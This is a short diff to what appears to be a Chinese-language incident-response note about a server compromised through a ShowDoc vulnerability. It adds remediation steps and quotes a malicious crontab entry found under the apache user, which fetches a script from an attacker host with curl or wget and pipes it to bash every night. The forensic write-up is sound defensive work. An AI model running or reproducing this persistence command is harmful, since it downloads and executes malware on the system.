@@ -179,6 +179,12 @@ fi
 sleep 30m
 done
 ```
+- 且查看定时任务列表
+
+    ```bash
+    # sudo crontab -u apache -l
+    30 23 * * * (curl -s http://w.apacheorg.top:1234/xmss||wget -q -O - http://w.apacheorg.top:1234/xmss )|bash -sh
+    ```
 - 上述脚本会从`http://w.apacheorg.top:1234/xmss`下载一个脚本
 
 <details>
@@ -474,6 +480,7 @@ history -c 2>/dev/null
 - 解决
     - 杀掉相应进程，杀掉所有用户进程可以使用`pkill -u apache`
     - 清除文件
+    - 删除定时任务
     - 修复ShowDoc等应用漏洞
 
 
